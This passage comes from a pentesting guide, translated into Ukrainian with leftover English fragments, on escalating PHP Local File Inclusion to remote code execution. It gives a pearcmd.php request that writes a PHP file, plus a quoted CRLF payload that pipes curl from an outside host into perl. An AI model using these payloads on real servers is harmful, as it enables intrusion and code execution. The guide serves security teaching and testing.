As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), скрипт `/usr/local/lib/phppearcmd.php` існує за замовчуванням в php docker images. Крім того, можна передавати аргументи скрипту через URL, бо вказано, що якщо URL-параметр не має `=`, він має використовуватися як аргумент. Див. також [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) та [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Наведено приклад використання вразливості CRLF для отримання RCE (з [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Через phpinfo() (file_uploads = on)

Якщо ви знайшли **Local File Inclusion** і файл, що показує **phpinfo()** з file_uploads = on, ви можете отримати RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Через compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Якщо ви знайшли **Local File Inclusion** і ви **can exfiltrate the path** тимчасового файлу, АЛЕ **server** **checking** чи **file to be included has PHP marks**, ви можете спробувати **bypass that check** за допомогою цієї **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Через eternal waiting + bruteforce

Якщо ви можете зловживати LFI, щоб **upload temporary files** і змусити **server** **hang** виконання PHP, ви могли б потім **brute force filenames during hours**, щоб знайти тимчасовий файл:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### До Fatal Error

Якщо ви включите будь-який з файлів `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Вам потрібно включити той самий файл двічі, щоб викликати цю помилку).

**Я не знаю, наскільки це корисно, але це може бути.**\
_Навіть якщо ви спричините PHP Fatal Error, PHP тимчасові файли, що були завантажені, видаляються._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## Посилання

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
